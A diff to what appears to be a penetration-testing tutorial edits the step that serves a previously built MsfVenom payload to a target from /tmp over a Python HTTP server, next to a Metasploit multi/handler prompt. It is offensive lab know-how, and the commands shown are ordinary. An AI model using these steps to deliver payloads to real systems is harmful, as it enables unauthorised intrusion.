@@ -104,9 +104,15 @@ msf6 exploit(multi/handler) > exploit
 
 ### 1.4 - Tranfser the Payload via Server
 
-Next we need to set up an HTTP server to transer the _MsfVenom_ payload that we have created earlier. 
+Next, we need to set up an HTTP server to transer the _MsfVenom_ payload that we have created earlier. 
 
-To do this, Open another terminal tab then start a Python3 HTTP server on port 80:
+Open another terminal tab, then navigate to the folder location of the payload:
+
+```bash
+cd /tmp/
+```
+
+start a Python3 HTTP server on port 80:
 
 ```bash
 sudo python3 -m http.server 80
